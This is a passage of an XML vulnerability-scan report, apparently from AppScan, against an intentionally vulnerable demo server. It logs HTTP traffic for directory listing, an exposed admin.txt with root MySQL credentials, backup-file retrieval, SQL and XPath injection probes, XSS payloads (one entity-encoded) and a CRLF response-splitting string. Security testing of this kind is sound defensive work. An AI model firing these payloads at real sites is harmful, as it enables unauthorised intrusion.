            <Validation Location="430" Length="10" String="Index of /" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DIRECT~1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 279
Date: Mon, 14 Jul 2014 14:47:01 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DIRECT~1&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DIRECT~1&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13378">
          <Comments />
          <Difference />
          <Reasoning>The response contains the content of a directory (directory listing). This indicates that the server allows the listing of directories, which is not usually recommended.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="398" Length="10" String="Index of /" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DIRECT~1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 279
Date: Mon, 14 Jul 2014 14:49:23 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DIRECT~1&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DIRECT~1&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DIRECT~1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 279
Date: Mon, 14 Jul 2014 14:49:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DIRECT~1&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DIRECT~1&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="DirectAccesstoAdministrationPages" Noise="False">
        <Url>http://tftarget/demo/DirectoryIndexing/</Url>
        <Entity />
        <Variant ID="10273">
          <Comments />
          <Difference>path: path /demo/DirectoryIndexing/ -&gt; /demo/DirectoryIndexing/admin.txt</Difference>
          <Reasoning>AppScan requested a file which is probably not a legitimate part of the application. The response status was 200 OK. This indicates that the test  succeeded in retrieving the content of the requested file.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="201" Length="3" String="200" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DirectoryIndexing/admin.txt HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 226
Date: Mon, 14 Jul 2014 14:47:01 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Wed, 01 Jun 2011 19:59:54 GMT
ETag: "1000000023445-e2-4a4abf6cf8280"
Accept-Ranges: bytes
Connection: close
Content-Type: text/plain

admin.txt

MySQL config
username: root
password: root

var;%20%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2031%0D%0A&lt;html&gt;Hacked%20by%20yehg.org&lt;/html&gt;

</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attScriptDownload" Noise="False">
        <Url>http://tftarget/demo/PredictableResource.php</Url>
        <Entity />
        <Variant ID="10534">
          <Comments />
          <Difference>path: path /demo/PredictableResource.php -&gt; /demo/PredictableResource.php.bak</Difference>
          <Reasoning>The test tried to retrieve a source code file. The fact that the response did not yield an error, and contained non-HTML contents, indicates that the source code retrieval succeeded.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="201" Length="3" String="200" />
            <Validation Location="450" Length="10" String="text/plain" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/PredictableResource.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 375
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Predictable Resource
     This file tells you where the (hopefully) poorly hidden files are. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/PredictableResource.php.bak HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 267
Date: Mon, 14 Jul 2014 14:47:05 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 02 Jun 2011 21:45:34 GMT
ETag: "2000000023438-10b-4a4c18e8b9b80"
Accept-Ranges: bytes
Connection: close
Content-Type: text/plain

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="10553">
          <Comments />
          <Difference>path: path /demo/PredictableResource.php -&gt; /demo/PredictableResource.php.BAK</Difference>
          <Reasoning>The test tried to retrieve a source code file. The fact that the response did not yield an error, and contained non-HTML contents, indicates that the source code retrieval succeeded.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="201" Length="3" String="200" />
            <Validation Location="450" Length="10" String="text/plain" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/PredictableResource.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 375
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- Predictable Resource
     This file tells you where the (hopefully) poorly hidden files are. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/PredictableResource.php.BAK HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 267
Date: Mon, 14 Jul 2014 14:47:05 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 02 Jun 2011 21:45:34 GMT
ETag: "2000000023438-10b-4a4c18e8b9b80"
Accept-Ranges: bytes
Connection: close
Content-Type: text/plain

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Predictable Resource Location&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Predictable Resource Location &lt;/h2&gt;

	&lt;ul&gt;
		&lt;li&gt;There is a backup of this file at http://192.168.1.30:8080/demo/PredictableResource.php.bak&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="GV_SQLErr" Noise="False">
        <Url>http://tftarget/demo/SQLI2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="13351">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=WF%27SQL%22Probe%3BA--B</Difference>
          <Reasoning>The response contains SQL Server errors. This suggests that the hazardous characters inserted by the test penetrated the application and reached the SQL query itself (i.e. that the application is vulnerable to SQL Injection).</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="814" Length="36" String="You have an error in your SQL syntax" />
            <Validation Location="852" Length="62" String="check the manual that corresponds to your MySQL server version" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/SQLI2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/SQLI.php

username=
HTTP/1.1 200 OK
Content-Length: 350
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
Jimmy"; SELECT id, password as name FROM users where name = "Jimmy
--&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Search Result &lt;/h2&gt;
		 
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/SQLI2.php HTTP/1.0
Content-Length: 32
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/SQLI.php

username=WF%27SQL%22Probe%3BA--B
HTTP/1.1 200 OK
Content-Length: 523
Date: Mon, 14 Jul 2014 14:47:24 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
Jimmy"; SELECT id, password as name FROM users where name = "Jimmy
--&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Search Result &lt;/h2&gt;
		Error Message: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Probe;A--B"' at line 1
 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attUndefinedState" Noise="False">
        <Url>http://tftarget/demo/SQLI2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12343">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username="</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="792" Length="36" String="You have an error in your SQL syntax" />
            <Validation Location="830" Length="62" String="check the manual that corresponds to your MySQL server version" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/SQLI2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/SQLI.php

username=
HTTP/1.1 200 OK
Content-Length: 350
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
Jimmy"; SELECT id, password as name FROM users where name = "Jimmy
--&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Search Result &lt;/h2&gt;
		 
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/SQLI2.php HTTP/1.0
Content-Length: 10
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/SQLI.php

username="
HTTP/1.1 200 OK
Content-Length: 515
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
Jimmy"; SELECT id, password as name FROM users where name = "Jimmy
--&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;SQL Injection Test&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Search Result &lt;/h2&gt;
		Error Message: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"""' at line 1
 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attBlindSqlInjectionStrings" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12398">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27+%2B+%27%27+%2B+%27</Difference>
          <Reasoning>This test appends a selection of conditions to the parameter value, to verify that it is embedded in an SQL query at the back-end. Three (or four) test requests are sent: the last is logically equal to the original, and the next-to-last is different (the others are for control purposes). A comparison of the last two test responses with the original confirms that the appended values were indeed added to an SQL query.</Reasoning>
          <ValidationDataLocationAtTestResponse />
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27+%2B+%27%27+%2B+%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:14 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 38
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27+%2B+%27+%2B+%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 540
Date: Mon, 14 Jul 2014 14:52:14 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either ' + ' + ' or 
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27+%2B+%27%27+%2B+%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:14 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 38
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27+%2B+%27+%2B+%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 540
Date: Mon, 14 Jul 2014 14:52:14 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either ' + ' + ' or 
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%27+%2B+%27%27+%2B+%27&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:14 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attCrossSiteScripting" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12400">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25224)%22&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1061" Length="12" String="alert(25224)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 70
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25224)%22&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 571
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either &gt;"'&gt;&lt;img src="javascript:alert(25224)"&gt; or 
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12401">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25226)&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1205" Length="12" String="alert(25226)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 159
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25226)&gt;&amp;password=
HTTP/1.1 200 OK
Content-Length: 624
Date: Mon, 14 Jul 2014 14:47:25 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
